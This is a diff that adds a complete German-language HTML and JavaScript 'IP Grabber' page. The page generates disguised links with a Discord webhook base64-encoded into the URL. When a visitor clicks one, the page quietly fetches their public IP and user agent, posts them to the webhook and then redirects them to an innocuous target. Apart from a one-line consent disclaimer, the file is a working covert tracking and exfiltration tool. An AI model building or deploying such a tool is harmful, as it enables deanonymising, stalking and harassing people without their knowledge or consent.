@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Grabber · Final</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; }
+        body {
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            background: #f1f5f9;
+            min-height: 100vh;
+            padding: 20px;
+            color: #0f172a;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 28px;
+            box-shadow: 0 20px 40px -10px rgba(0,0,0,0.1);
+            padding: 30px;
+        }
+        h1 { display: flex; align-items: center; gap: 10px; }
+        h1::before { content: "🌐"; font-size: 2rem; }
+        .warning {
+            background: #fffbeb;
+            border: 1px solid #fcd34d;
+            color: #92400e;
+            padding: 16px;
+            border-radius: 16px;
+            margin-bottom: 28px;
+        }
+        .tabs { display: flex; gap: 6px; margin-bottom: 24px; border-bottom: 2px solid #cbd5e1; }
+        .tab {
+            padding: 12px 24px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            font-weight: 600;
+            color: #64748b;
+            border-radius: 40px 40px 0 0;
+        }
+        .tab.active { color: #2563eb; border-bottom: 3px solid #2563eb; background: white; }
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
+        .form-group { margin-bottom: 24px; }
+        label { display: block; margin-bottom: 8px; font-weight: 600; }
+        input, textarea {
+            width: 100%;
+            padding: 14px 18px;
+            border: 1.5px solid #cbd5e1;
+            border-radius: 20px;
+            font-size: 1rem;
+        }
+        button {
+            background: #2563eb;
+            color: white;
+            border: none;
+            padding: 14px 28px;
+            border-radius: 40px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        button.copy-btn { background: #10b981; }
+        button.secondary { background: #e2e8f0; color: #1e293b; }
+        .url-display {
+            background: #f8fafc;
+            padding: 16px;
+            border-radius: 24px;
+            font-family: monospace;
+            word-break: break-all;
+            border: 1.5px solid #cbd5e1;
+        }
+        .stats { margin-top: 20px; padding: 16px; background: #f1f5f9; border-radius: 18px; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        th { background: #eef2ff; padding: 12px; }
+        td { padding: 12px; border-bottom: 1px solid #e2e8f0; }
+        .badge { background: #e2e8f0; padding: 4px 12px; border-radius: 30px; }
+        .debug-panel {
+            background: #1e293b;
+            color: #e2e8f0;
+            padding: 16px;
+            border-radius: 16px;
+            font-family: monospace;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>IP‑Logger · Eingebauter Webhook im Link</h1>
+    <div class="warning">
+        <strong>⚖️ Nur für Bildungs‑ und Testzwecke mit Einwilligung.</strong>
+    </div>
+
+    <div class="tabs">
+        <div class="tab active" data-tab="generator">🔗 Link Generator</div>
+        <div class="tab" data-tab="logs">📋 Lokale Logs</div>
+        <div class="tab" data-tab="settings">⚙️ Einstellungen</div>
+    </div>
+
+    <!-- Generator -->
+    <div id="generator" class="tab-content active">
+        <div class="form-group">
+            <label>🎯 Ziel‑URL</label>
+            <input type="url" id="targetUrl" value="https://example.com" required>
+        </div>
+        <div class="form-group">
+            <label>📡 Discord Webhook URL (wird in Link eingebettet)</label>
+            <input type="text" id="webhookInput" placeholder="https://discord.com/api/webhooks/...">
+            <button class="secondary" id="testWebhookBtn" style="margin-top:8px;">🧪 Webhook testen</button>
+            <span id="testResult"></span>
+        </div>
+        <div class="form-group">
+            <label>🌍 Server‑Basis‑URL (wo diese Datei liegt)</label>
+            <input type="url" id="baseUrlInput" placeholder="Leer lassen für aktuelle Adresse">
+        </div>
+        <div class="form-group">
+            <label>💬 Nachricht (für Discord)</label>
+            <input type="text" id="customMsg" placeholder="Neuer Klick">
+        </div>
+        <button id="generateBtn">✨ Link generieren</button>
+
+        <div id="resultPanel" style="display:none; margin-top:28px;">
+            <h3>🔽 Dein IP‑Grab‑Link</h3>
+            <div class="url-display" id="generatedUrl"></div>
+            <div style="display:flex; gap:12px; margin-top:16px;">
+                <button class="copy-btn" id="copyBtn">📋 Kopieren</button>
+                <button class="secondary" id="testOwnBtn">🧪 Selbst testen</button>
+            </div>
+            <div class="stats">
+                <p>👁️ Klicks: <strong id="clickCount">0</strong> | Letzter: <span id="lastAccess">—</span></p>
+                <p>🔍 ID: <span id="linkIdDisplay"></span></p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Logs -->
+    <div id="logs" class="tab-content">
+        <h3>📜 Lokale Logs (nur deine eigenen Tests)</h3>
+        <button class="secondary" id="clearLogsBtn">🗑️ Alle löschen</button>
+        <table id="logsTable">
+            <thead><tr><th>IP</th><th>Zeit</th><th>User‑Agent</th><th>Link</th></tr></thead>
+            <tbody id="logsBody"></tbody>
+        </table>
+    </div>
+
+    <!-- Einstellungen -->
+    <div id="settings" class="tab-content">
+        <h3>Einstellungen</h3>
+        <div class="form-group">
+            <label>⏱️ Verzögerung (ms)</label>
+            <input type="number" id="delayInput" value="3000" min="0" max="10000">
+        </div>
+        <div class="form-group">
+            <label><input type="checkbox" id="collectUACb" checked> User‑Agent erfassen</label>
+        </div>
+        <div class="form-group">
+            <label><input type="checkbox" id="storeLocalCb" checked> Lokal speichern</label>
+        </div>
+        <div class="form-group">
+            <label>Standard‑Basis‑URL</label>
+            <input type="url" id="defaultBaseUrl" placeholder="https://...">
+        </div>
+        <button id="saveSettingsBtn">💾 Speichern</button>
+    </div>
+</div>
+
+<script>
+    (function(){
+        "use strict";
+
+        // ---------- STATE ----------
+        let links = [];
+        let ipLogs = [];
+        let settings = {
+            delay: 3000,
+            collectUA: true,
+            storeLocal: true,
+            defaultBase: ''
+        };
+        let currentLinkId = null;
+
+        // ---------- HILFSFUNKTIONEN ----------
+        function generateId() { return Date.now() + '-' + Math.random().toString(36).substr(2,8); }
+        function formatDate(iso) { return new Date(iso).toLocaleString('de-DE'); }
+        function base64Encode(str) { return btoa(unescape(encodeURIComponent(str))); }
+        function base64Decode(str) { return decodeURIComponent(escape(atob(str))); }
+
+        // ---------- STORAGE ----------
+        function loadStorage() {
+            try {
+                const l = localStorage.getItem('ipg_links'); if(l) links = JSON.parse(l);
+                const g = localStorage.getItem('ipg_logs'); if(g) ipLogs = JSON.parse(g);
+                const s = localStorage.getItem('ipg_settings'); if(s) settings = {...settings, ...JSON.parse(s)};
+            } catch(e){}
+            document.getElementById('delayInput').value = settings.delay;
+            document.getElementById('collectUACb').checked = settings.collectUA;
+            document.getElementById('storeLocalCb').checked = settings.storeLocal;
+            document.getElementById('defaultBaseUrl').value = settings.defaultBase || '';
+            renderLogs();
+        }
+        function saveLinks() { if(settings.storeLocal) localStorage.setItem('ipg_links', JSON.stringify(links)); }
+        function saveLogs() { if(settings.storeLocal) localStorage.setItem('ipg_logs', JSON.stringify(ipLogs)); }
+        function saveSettings() {
+            settings.delay = parseInt(document.getElementById('delayInput').value,10)||3000;
+            settings.collectUA = document.getElementById('collectUACb').checked;
+            settings.storeLocal = document.getElementById('storeLocalCb').checked;
+            settings.defaultBase = document.getElementById('defaultBaseUrl').value.trim();
+            localStorage.setItem('ipg_settings', JSON.stringify(settings));
+        }
+
+        // ---------- IP & DISCORD ----------
+        async function fetchIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                return (await res.json()).ip;
+            } catch(e) { return '0.0.0.0'; }
+        }
+
+        async function sendDiscord(webhookUrl, ip, ua, linkId, customMsg) {
+            if (!webhookUrl || !webhookUrl.includes('discord.com/api/webhooks')) return false;
+            const embed = {
+                title: "🌍 IP‑Logger",
+                description: `${customMsg || 'Neuer Klick'}\n\n**IP:** ${ip}\n**User‑Agent:** ${ua || '—'}`,
+                color: 0x3b82f6,
+                timestamp: new Date().toISOString(),
+                footer: { text: `Link: ${linkId}` }
+            };
+            try {
+                const resp = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {'Content-Type':'application/json'},
+                    body: JSON.stringify({ embeds: [embed] })
+                });
+                return resp.ok;
+            } catch(e) { return false; }
+        }
+
+        // ---------- LINK GENERIEREN (Webhook eingebettet) ----------
+        function getBaseUrl() {
+            let base = document.getElementById('baseUrlInput').value.trim();
+            if (!base) base = settings.defaultBase;
+            if (!base) base = window.location.origin + window.location.pathname;
+            if (!base.endsWith('/') && !base.includes('?')) base += '/';
+            return base;
+        }
+
+        function generateLink() {
+            const target = document.getElementById('targetUrl').value.trim();
+            if (!target) { alert('Ziel-URL fehlt'); return null; }
+            try { new URL(target); } catch { alert('Ungültige Ziel-URL'); return null; }
+
+            const webhook = document.getElementById('webhookInput').value.trim();
+            if (!webhook) { alert('Bitte Webhook-URL eingeben'); return null; }
+            if (!webhook.includes('discord.com/api/webhooks')) { alert('Ungültige Webhook-URL'); return null; }
+
+            const customMsg = document.getElementById('customMsg').value.trim();
+            const linkId = generateId();
+            const base = getBaseUrl();
+
+            // Webhook base64-kodiert in den Link einbetten
+            const encodedWh = base64Encode(webhook);
+            const params = new URLSearchParams();
+            params.set('id', linkId);
+            params.set('to', target);
+            params.set('wh', encodedWh);
+            if (customMsg) params.set('msg', base64Encode(customMsg));
+
+            const finalUrl = base + (base.includes('?') ? '&' : '?') + params.toString();
+
+            // Link speichern (nur für Statistik)
+            const newLink = {
+                id: linkId,
+                target, webhook, customMsg,
+                clicks: 0, lastAccess: null,
+                created: new Date().toISOString()
+            };
+            links.push(newLink);
+            saveLinks();
+
+            // Anzeige
+            document.getElementById('resultPanel').style.display = 'block';
+            document.getElementById('generatedUrl').textContent = finalUrl;
+            document.getElementById('linkIdDisplay').textContent = linkId;
+            currentLinkId = linkId;
+            updateStats(newLink);
+            return finalUrl;
+        }
+
+        function updateStats(link) {
+            document.getElementById('clickCount').textContent = link.clicks || 0;
+            document.getElementById('lastAccess').textContent = link.lastAccess ? formatDate(link.lastAccess) : '—';
+        }
+
+        // ---------- REDIRECT HANDLER (mit Debug) ----------
+        async function handleRedirect() {
+            const params = new URLSearchParams(window.location.search);
+            const linkId = params.get('id');
+            const target = params.get('to');
+            const encodedWh = params.get('wh');
+            const encodedMsg = params.get('msg');
+            const debug = params.get('debug') === '1';
+
+            if (!linkId || !target || !encodedWh) return false;
+
+            // Webhook dekodieren
+            let webhookUrl = '';
+            let customMsg = '';
+            try {
+                webhookUrl = base64Decode(encodedWh);
+                if (encodedMsg) customMsg = base64Decode(encodedMsg);
+            } catch(e) {
+                if (debug) document.body.innerHTML = '<h2>Fehler: Ungültige Webhook-Kodierung</h2>';
+                return false;
+            }
+
+            // IP ermitteln
+            const ip = await fetchIP();
+            const ua = settings.collectUA ? navigator.userAgent : null;
+
+            // Discord senden
+            const discordOk = await sendDiscord(webhookUrl, ip, ua, linkId, customMsg);
+
+            // Debug-Ausgabe falls gewünscht
+            if (debug) {
+                document.body.innerHTML = `
+                    <div style="padding:30px; font-family:monospace;">
+                        <h2>🐞 Debug-Informationen</h2>
+                        <p><strong>IP:</strong> ${ip}</p>
+                        <p><strong>User-Agent:</strong> ${ua || 'deaktiviert'}</p>
+                        <p><strong>Webhook:</strong> ${webhookUrl.substring(0,50)}...</p>
+                        <p><strong>Discord gesendet:</strong> ${discordOk ? '✅ Erfolg' : '❌ Fehler'}</p>
+                        <p><strong>Ziel-URL:</strong> ${target}</p>
+                        <p><em>Weiterleitung in ${settings.delay}ms...</em></p>
+                    </div>
+                `;
+            } else {
+                // Normale Weiterleitungsseite
+                document.body.innerHTML = `
+                    <div style="display:flex; align-items:center; justify-content:center; height:100vh; background:#0f172a; color:#e2e8f0; font-family:system-ui;">
+                        <div style="text-align:center;">
+                            <h2>Weiterleitung...</h2>
+                            <div style="width:50px; height:50px; border:5px solid #334155; border-top-color:#38bdf8; border-radius:50%; animation:spin 1s infinite; margin:20px auto;"></div>
+                            <style>@keyframes spin{to{transform:rotate(360deg)}}</style>
+                        </div>
+                    </div>
+                `;
+            }
+
+            // Lokal loggen (falls aktiv)
+            if (settings.storeLocal) {
+                const logEntry = { id: generateId(), ip, ua, linkId, timestamp: new Date().toISOString() };
+                ipLogs.push(logEntry);
+                saveLogs();
+                // Link-Statistik aktualisieren
+                const link = links.find(l => l.id === linkId);
+                if (link) { link.clicks++; link.lastAccess = new Date().toISOString(); saveLinks(); }
+            }
+
+            // Weiterleitung
+            setTimeout(() => { window.location.href = target; }, settings.delay);
+            return true;
+        }
+
+        // ---------- LOGS TABELLE ----------
+        function renderLogs() {
+            const tbody = document.getElementById('logsBody');
+            if (!ipLogs.length) {
+                tbody.innerHTML = '<tr><td colspan="4">Keine Logs</td></tr>';
+                return;
+            }
+            tbody.innerHTML = [...ipLogs].reverse().map(l => `
+                <tr><td>${l.ip}</td><td>${formatDate(l.timestamp)}</td><td>${l.ua?.substring(0,30)||'-'}</td><td>${l.linkId.slice(-6)}</td></tr>
+            `).join('');
+        }
+
+        // ---------- UI INIT ----------
+        function initUI() {
+            // Tabs
+            document.querySelectorAll('.tab').forEach(t => {
+                t.addEventListener('click', () => {
+                    document.querySelectorAll('.tab, .tab-content').forEach(el => el.classList.remove('active'));
+                    t.classList.add('active');
+                    document.getElementById(t.dataset.tab).classList.add('active');
+                });
+            });
+
+            document.getElementById('generateBtn').addEventListener('click', generateLink);
+            document.getElementById('copyBtn').addEventListener('click', () => {
+                const url = document.getElementById('generatedUrl').textContent;
+                navigator.clipboard?.writeText(url).then(() => alert('Kopiert!'));
+            });
+            document.getElementById('testOwnBtn').addEventListener('click', async () => {
+                if (!currentLinkId) return alert('Kein Link generiert.');
+                const url = document.getElementById('generatedUrl').textContent;
+                window.open(url + '&debug=1', '_blank');
+            });
+
+            document.getElementById('testWebhookBtn').addEventListener('click', async () => {
+                const wh = document.getElementById('webhookInput').value.trim();
+                if (!wh) return alert('Webhook eingeben');
+                const ok = await sendDiscord(wh, 'Test-IP', 'Test-UA', 'test', 'Testnachricht');
+                document.getElementById('testResult').textContent = ok ? '✅ Erfolg' : '❌ Fehler';
+            });
+
+            document.getElementById('clearLogsBtn').addEventListener('click', () => {
+                ipLogs = []; saveLogs(); renderLogs();
+            });
+
+            document.getElementById('saveSettingsBtn').addEventListener('click', () => {
+                saveSettings();
+                alert('Gespeichert');
+            });
+        }
+
+        // ---------- START ----------
+        loadStorage();
+        (async function(){
+            if (!(await handleRedirect())) {
+                initUI();
+                renderLogs();
+            }
+        })();
+    })();
+</script>
+</body>
+</html>
